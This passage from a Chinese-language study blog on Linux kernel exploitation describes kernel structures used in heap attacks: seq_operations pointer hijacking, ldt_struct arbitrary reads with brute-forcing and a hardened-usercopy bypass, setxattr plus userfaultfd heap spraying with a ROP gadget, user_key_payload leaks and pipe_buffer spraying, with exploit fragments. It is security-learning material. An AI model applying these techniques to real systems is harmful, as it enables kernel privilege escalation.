class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">* 该结构体定义于 `/include/linux/seq_file.h` 当中。</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">struct seq_file &#123;</span><br><span class="line">    char *buf;</span><br><span class="line">    size_t size;</span><br><span class="line">    size_t from;</span><br><span class="line">    size_t count;</span><br><span class="line">    size_t pad_until;</span><br><span class="line">    loff_t index;</span><br><span class="line">    loff_t read_pos;</span><br><span class="line">    struct mutex lock;</span><br><span class="line">    const struct seq_operations *op;</span><br><span class="line">    int poll_event;</span><br><span class="line">    const struct file *file;</span><br><span class="line">    void *private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></code></pre></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">    <span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="泄露内核基地址-text-段"><a href="#泄露内核基地址-text-段" class="headerlink" title="泄露内核基地址(.text 段)"></a>泄露内核基地址(.text 段)</h5><p><code>start</code>即为函数 <code>single_start</code>函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/kallsyms | grep <span class="string">&#x27;single_start&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="劫持内核执行流-1"><a href="#劫持内核执行流-1" class="headerlink" title="劫持内核执行流"></a>劫持内核执行流</h5><p>当 <code>read</code> 一个 <code>stat</code> 文件时，内核会调用其 <code>proc_ops</code> 的 <code>proc_read_iter</code> 指针，其默认值为 <code>seq_read_iter()</code> 函数</p><p>只需要控制 <code>seq_operations-&gt;start</code> 后再用 <code>read</code>读取对应 <code>stat</code> 文件便能控制内核执行流（但是参数不可控，可以配合 <code>pt_reg</code>结构体使用）。</p><p>调试时可在 <code>seq_read_iter</code>函数处下断点。</p><p>可以选择覆盖 <code>start</code>函数指针为一个 <code>add_rsp_xxx_ret</code>类似的 <code>gadget</code>，将栈抬到 <code>pt_reg</code>结构体处，从而执行ROP。</p><h3 id="ldt-struct结构体"><a href="#ldt-struct结构体" class="headerlink" title="ldt_struct结构体"></a>ldt_struct结构体</h3><h3 id="ldt-struct-kmalloc-16-slub-kmalloc-32-slab"><a href="#ldt-struct-kmalloc-16-slub-kmalloc-32-slab" class="headerlink" title="ldt_struct: kmalloc-16(slub)&#x2F;kmalloc-32(slab)"></a>ldt_struct: kmalloc-16(slub)&#x2F;kmalloc-32(slab)</h3><p>在内核中与 LDT 相关联的结构体为 <code>ldt_struct</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> *       <span class="title">entries</span>;</span>              <span class="comment">/*     0   0x8 */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>               nr_entries;           <span class="comment">/*   0x8   0x4 */</span></span><br><span class="line"><span class="type">int</span>                        slot;                 <span class="comment">/*   0xc   0x4 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size: 16, cachelines: 1, members: 3 */</span></span><br><span class="line"><span class="comment">/* last cacheline: 16 bytes */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>modify_ldt</code> 系统调用可以用来操纵对应进程的 <code>ldt_struct</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="type">int</span> , func , <span class="type">void</span> __user * , ptr ,</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (func) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        ret = read_ldt(ptr, bytecount);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        ret = write_ldt(ptr, bytecount, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        ret = read_default_ldt(ptr, bytecount);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">        ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The SYSCALL_DEFINE() macros give us an &#x27;unsigned long&#x27;</span></span><br><span class="line"><span class="comment">     * return type, but tht ABI for sys_modify_ldt() expects</span></span><br><span class="line"><span class="comment">     * &#x27;int&#x27;.  This cast gives us an int-sized value in %rax</span></span><br><span class="line"><span class="comment">     * for the return code.  The &#x27;unsigned&#x27; is necessary so</span></span><br><span class="line"><span class="comment">     * the compiler does not try to sign-extend the negative</span></span><br><span class="line"><span class="comment">     * return codes into the high half of the register when</span></span><br><span class="line"><span class="comment">     * taking the value from int-&gt;long.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="泄露地址：modify-ldt-系统调用-read-ldt"><a href="#泄露地址：modify-ldt-系统调用-read-ldt" class="headerlink" title="泄露地址：modify_ldt 系统调用 - read_ldt()"></a>泄露地址：modify_ldt 系统调用 - read_ldt()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">read_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">        retval = -EFAULT;</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">out_unlock:</span><br><span class="line">    up_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>read_ldt()</code> <strong>直接调用 copy_to_user 向用户地址空间拷贝数据</strong> ，若是能够控制 <code>ldt-&gt;entries</code> 便能够完成内核的任意地址读，由此泄露出内核数据。</p><p><code>copy_to_user()</code> 的一个特性：对于非法地址，其并不会造成 kernel panic，只会返回一个非零的错误码。我们可以多次修改 ldt-&gt;entries 并多次调用 <code>modify_ldt()</code> 以 爆破内核 .text 段地址与 page_offset_base ，若是成功命中，则 <code>modify_ldt</code> 会返回给我们一个非负值。</p><p>但是由于 <code>Hardened usercopy</code> 的存在，对于直接拷贝代码段上数据的行为会导致 kernel panic，但是在<strong>page_offset_base + 0x9d000 的地方（非代码段）存储着 secondary_startup_64 函数的地址，于是思路就是爆破page_offset_base的地址</strong></p><h4 id="绕过hardened-usercopy"><a href="#绕过hardened-usercopy" class="headerlink" title="绕过hardened usercopy"></a>绕过hardened usercopy</h4><p>通过 <code>fork</code>创建子进程，然后使用子进程来 <code>read_ldt</code> ，在 <code>fork</code>时，会将父进程的 <code>ldt</code>拷贝给子进程</p><p><img src="/image/learning_linux_kernel_2/1760624453851.png" alt="1760624453851"></p><h3 id="setxattr系统调用-GFP-KERNEL"><a href="#setxattr系统调用-GFP-KERNEL" class="headerlink" title="setxattr系统调用 GFP_KERNEL"></a>setxattr系统调用 GFP_KERNEL</h3><h4 id="setxattr"><a href="#setxattr" class="headerlink" title="setxattr"></a>setxattr</h4><p>可以通过以下方式使用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">setxattr(<span class="string">&quot;/exploit&quot;</span>, <span class="string">&quot;username&quot;</span>, value, size, <span class="number">0</span>); <span class="comment">//第一个参数指定一个存在的文件，第二个参数随便</span></span><br></pre></td></tr></table></figure><p>该系统调用会走到下面这个函数：可以看到能够进行任意大小的 object 分配，size可控且内容可控，但是之后会被释放掉</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span></span><br><span class="line"><span class="title function_">setxattr</span><span class="params">(<span class="keyword">struct</span> dentry *d, <span class="type">const</span> <span class="type">char</span> __user *name, <span class="type">const</span> <span class="type">void</span> __user *value,</span></span><br><span class="line"><span class="params">     <span class="type">size_t</span> size, <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">        kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!kvalue)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//,..</span></span><br><span class="line"></span><br><span class="line">    kvfree(kvalue);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="利用-结合userfaultfd来堆占位"><a href="#利用-结合userfaultfd来堆占位" class="headerlink" title="利用- 结合userfaultfd来堆占位"></a>利用- 结合userfaultfd来堆占位</h5><p>我们申请一块连续的两页内存:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| memory1: size=pagesize | memory2: size=pagesize |</span><br></pre></td></tr></table></figure><p>随后,我们<strong>为第二部分的内存,注册 <code>userfaultfd</code></strong> , 使得访问到这里时直接卡住.</p><p><img src="/image/learning_linux_kernel_2/1760678357093.png" alt="1760709522108"></p><p>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwn_addr = mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">register_userfaultfd_for_thread_stucking(&amp;monitor_setx, (<span class="type">void</span>*)((<span class="type">size_t</span>)pwn_addr + <span class="number">0x1000</span>), <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">*(<span class="type">size_t</span>*)((<span class="type">size_t</span>)pwn_addr + <span class="number">0x1000</span> - <span class="number">8</span>) = add_rsp_0x1f8 + kernel_offset;</span><br><span class="line">setxattr(<span class="string">&quot;/init&quot;</span>, <span class="string">&quot;ltfall&quot;</span>, (<span class="type">char</span>*)((<span class="type">size_t</span>)pwn_addr + <span class="number">0x1000</span> - <span class="number">8</span>), <span class="number">0x20</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>可以看到,我们上面便申请了一个 <code>kmalloc-32</code>的 <code>obj</code>,并写入了 <code>add_rsp_0x1f8</code>的 <code>gadget</code></p><h4 id="user-key-payload-kmalloc-any-GFP-KERNEL"><a href="#user-key-payload-kmalloc-any-GFP-KERNEL" class="headerlink" title="user_key_payload (kmalloc-any, GFP_KERNEL)"></a>user_key_payload (kmalloc-any, GFP_KERNEL)</h4><h5 id="定义：-4"><a href="#定义：-4" class="headerlink" title="定义："></a>定义：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU destructor */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span>datalen;<span class="comment">/* length of this data */</span></span><br><span class="line"><span class="comment">//以上总共0x18字节</span></span><br><span class="line"><span class="type">char</span>data[] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>rcu_head</code>结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">void</span> (*func)(<span class="keyword">struct</span> callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="type">void</span> *))));</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rcu_head callback_head</span></span><br></pre></td></tr></table></figure><p>在内核当中存在一个用于密钥管理的子系统，内核提供了 <code>add_key()</code> 系统调用进行密钥的创建，并提供了 <code>keyctl()</code> 系统调用进行密钥的读取、更新、销毁等功能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">key_serial_t</span> <span class="title function_">add_key</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *type, <span class="type">const</span> <span class="type">char</span> *description,</span></span><br><span class="line"><span class="params">                    <span class="type">const</span> <span class="type">void</span> *payload, <span class="type">size_t</span> plen,<span class="type">key_serial_t</span> keyring)</span>;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">syscall</span><span class="params">(__NR_keyctl, <span class="type">int</span> operation, <span class="type">__kernel_ulong_t</span> arg2,</span></span><br><span class="line"><span class="params">             <span class="type">__kernel_ulong_t</span> arg3, <span class="type">__kernel_ulong_t</span> arg4,</span></span><br><span class="line"><span class="params">             <span class="type">__kernel_ulong_t</span> arg5)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当我们调用 <code>add_key()</code> 分配一个带有 <code>description</code> 字符串的、类型为 <code>&quot;user&quot;</code> 的、长度为 <code>plen</code> 的内容为 <code>payload</code> 的密钥时，内核会经历如下过程：</p><ul><li>首先会在内核空间中分配 <code>obj1</code> 与 <code>obj2</code>，分配 <code>flag</code> 为 <code>GFP_KERNEL</code>，用以保存 <code>description</code> （字符串，最大大小为 <code>4096</code>）、<code>payload</code> （普通数据，大小无限制）</li><li>分配 <code>obj3</code> 保存 <code>description</code> ，分配 <code>obj4</code> 保存 <code>payload</code>，分配 <code>flag</code> 皆为 <code>GFP_KERNEL</code></li><li>释放 <code>obj1</code> 与 <code>obj2</code>，返回密钥 <code>id</code></li></ul><p>总而言之在保存 <code>description</code>和 <code>payload</code>时都会分别利用中间体 <code>obj</code></p><h5 id="调用-keyctl-read系统调用越界读"><a href="#调用-keyctl-read系统调用越界读" class="headerlink" title="调用 keyctl_read系统调用越界读"></a>调用 <code>keyctl_read</code>系统调用越界读</h5><p>控制 <code>user_key_payload</code> 结构体中的 <code>datalen</code>为一个大于其 <code>payload</code>长度的数字，读到其他被释放的 <code>user_key_payload</code> ，即可读到 <code>rcu-&gt;func</code> 和 <code>rcu-&gt;func</code> 。</p><h5 id="泄露内核基地址"><a href="#泄露内核基地址" class="headerlink" title="泄露内核基地址"></a>泄露内核基地址</h5><p>利用 <code>key_revoke</code>来销毁密钥时，<code>rcu-&gt;func</code>将会被赋值为 <code>user_free_payload_rcu</code>函数的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">key_revoke</span><span class="params">(<span class="type">int</span> keyid)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/kallsyms | grep <span class="string">&#x27;user_free_payload_rcu&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="泄露内核堆地址"><a href="#泄露内核堆地址" class="headerlink" title="泄露内核堆地址"></a>泄露内核堆地址</h5><p>读取 <code>rcu-&gt;func</code>泄露堆地址</p><h3 id="pipe-管道相关"><a href="#pipe-管道相关" class="headerlink" title="pipe 管道相关"></a>pipe 管道相关</h3><h4 id="pipe-inode-info"><a href="#pipe-inode-info" class="headerlink" title="pipe_inode_info"></a>pipe_inode_info</h4><h5 id="定义：-5"><a href="#定义：-5" class="headerlink" title="定义："></a>定义：</h5><p>当我们 <code>void pipe(int fd[])</code>打开管道时，会创建两个结构体，分别为 <code>pipe_inode_info</code> （<code>kmalloc-192 | GFP_KERNEL_ACCOUNT</code>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line"><span class="type">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> tail;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_usage;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="type">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> nr_accounted;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> readers;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> writers;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> files;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> r_counter;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> w_counter;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span> <span class="comment">//***</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>pipe_inode_info-&gt;bufs</code> 为一个动态分配的结构体数组，因此我们可以利用他来泄露出内核的“堆”上地址</p><p>和 <code>pipe_buffer</code> （<code>kmalloc-1k | GFP_KERNEL_ACCOUNT</code>），往 <code>pipe_fd[1]</code>中写入数据成功后才会初始化 <code>pipe_buffer</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pipe_buffer_init</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] pipe buffer init&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_PIPE_COUNT; ++i) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> k = i;</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;QQEEDD&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pipe_fd[i][0]：这是管道的 读取端 (Read End)。通过这个文件描述符从管道缓冲区中读取数据。</span></span><br><span class="line"><span class="comment">pipe_fd[i][1]：这是管道的 写入端 (Write End)。通过这个文件描述符向管道缓冲区中写入数据。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><img src="/image/learning_linux_kernel_2/1760602477857.png" alt="1760602477857"></p><p>具体到每个 <code>pipe_buffer</code> 其中的 <code>offset</code> 和 <code>len</code> 标记了 <code>pipe_buffer</code> 对应内存页中的数据。</p><p><img src="/image/learning_linux_kernel_2/1760602494097.png" alt="1760602494097"></p><p>可以通过系统调用更改pipe_buffer的大小</p><p>当选项为 <code>F_SETPIPE_SZ</code> 其会修改当前pipe的bufs数组大小为第三个参数 <code>(arg&gt;&gt;12)*sizeof(*bufs)</code> 注意arg&gt;&gt;12（2^12&#x3D;0x1000）必须是2的幂次方 <code>sizeof(*bufs)=64</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">pipe_buffer_resize</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] pipe buffer resize&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_PIPE_COUNT; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">4</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;resize pipe&quot;</span>);  </span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>pipe_buf_operations</code>结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * -&gt;confirm() verifies that the data in the pipe buffer is there</span></span><br><span class="line"><span class="comment"> * and that the contents are good. If the pages in the pipe belong</span></span><br><span class="line"><span class="comment"> * to a file system, we may need to wait for IO completion in this</span></span><br><span class="line"><span class="comment"> * hook. Returns 0 for good, or a negative error value in case of</span></span><br><span class="line"><span class="comment"> * error.  If not present all pages are considered good.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When the contents of this pipe buffer has been completely</span></span><br><span class="line"><span class="comment"> * consumed by a reader, -&gt;release() is called.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> (*release)(<span 